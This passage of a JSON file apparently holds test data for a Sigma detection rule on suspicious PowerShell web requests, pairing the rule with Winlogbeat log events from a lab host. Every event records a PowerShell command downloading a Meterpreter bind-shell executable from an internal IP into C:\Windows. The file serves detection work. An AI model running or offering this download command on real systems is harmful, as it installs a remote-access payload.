                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.903Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 7,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"FileSystem\" is Started. \n\nDetails: \n\tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "FileSystem",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6592,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.903Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 9,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Function\" is Started. \n\nDetails: \n\tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Function",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6593,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.903Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 11,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Variable\" is Started. \n\nDetails: \n\tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Variable",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6594,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Engine Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 400,
                    "created": "2022-09-27T13:45:07.904Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 13,
                    "type": [
                        "start"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Engine state is changed from None to Available. \n\nDetails: \n\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=666a04b8-71eb-4c30-a3f5-11644ab24fe9\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "engine": {
                        "new_state": "Available",
                        "previous_state": "None",
                        "version": "5.1.19041.1237"
                    },
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 400,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6595,
                    "task": "Engine Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.562Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Pipeline Execution Details",
                    "category": [
                        "process"
                    ],
                    "code": 800,
                    "created": "2022-09-27T13:45:07.904Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 15,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Pipeline execution details for command line: $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\"). \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=666a04b8-71eb-4c30-a3f5-11644ab24fe9\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\") \n\nDetails: \nCommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "New-Object",
                                "type": "CommandInvocation",
                                "value": "\"New-Object\""
                            },
                            {
                                "name": "\"TypeName\"",
                                "related_command": "New-Object",
                                "type": "ParameterBinding",
                                "value": "\"System.Net.WebClient\""
                            }
                        ],
                        "value": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9",
                    "sequence": 1,
                    "total": 1
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 800,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6596,
                    "task": "Pipeline Execution Details"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.562+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.572Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Executing Pipeline",
                    "category": [
                        "process"
                    ],
                    "code": 4103,
                    "created": "2022-09-27T13:45:08.911Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "Microsoft-Windows-PowerShell",
                    "sequence": 16,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = d69f1bbf-903d-443c-89cb-973593849f0a\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 666a04b8-71eb-4c30-a3f5-11644ab24fe9\n        Pipeline ID = 1\n        Command Name = New-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 16\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "New-Object",
                                "type": "CommandInvocation",
                                "value": "\"New-Object\""
                            },
                            {
                                "name": "\"TypeName\"",
                                "related_command": "New-Object",
                                "type": "ParameterBinding",
                                "value": "\"System.Net.WebClient\""
                            }
                        ],
                        "name": "New-Object",
                        "type": "Cmdlet"
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "id": "Microsoft.PowerShell",
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "activity_id": "{35166aea-d26c-0000-6b4d-17356cd2d801}",
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-PowerShell/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 4103,
                    "opcode": "To be used when operation is just executing a method",
                    "process": {
                        "pid": 3000,
                        "thread": {
                            "id": 1648
                        }
                    },
                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
                    "provider_name": "Microsoft-Windows-PowerShell",
                    "record_id": 6057,
                    "task": "Executing Pipeline",
                    "user": {
                        "domain": "CLIENT1",
                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
                        "name": "ssh",
                        "type": "User"
                    },
                    "version": 1
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.572+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.624Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Pipeline Execution Details",
                    "category": [
                        "process"
                    ],
                    "code": 800,
                    "created": "2022-09-27T13:45:07.905Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 17,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=17\n\n\tUserId=CLIENT1\\ssh\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=666a04b8-71eb-4c30-a3f5-11644ab24fe9\n\tPipelineId=1\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\"",
                "powershell": {
                    "command": {
                        "invocation_details": [
                            {
                                "related_command": "Out-Default",
                                "type": "CommandInvocation",
                                "value": "\"Out-Default\""
                            }
                        ]
                    },
                    "engine": {
                        "version": "5.1.19041.1237"
                    },
                    "pipeline_id": "1",
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9",
                    "sequence": 1,
                    "total": 1
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "related": {
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 800,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6597,
                    "task": "Pipeline Execution Details"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.624+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.624Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Engine Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 403,
                    "created": "2022-09-27T13:45:07.905Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 19,
                    "type": [
                        "end"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Engine state is changed from Available to Stopped. \n\nDetails: \n\tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=19\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=666a04b8-71eb-4c30-a3f5-11644ab24fe9\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "engine": {
                        "new_state": "Stopped",
                        "previous_state": "Available",
                        "version": "5.1.19041.1237"
                    },
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "runspace_id": "666a04b8-71eb-4c30-a3f5-11644ab24fe9"
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 403,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6598,
                    "task": "Engine Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.624+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
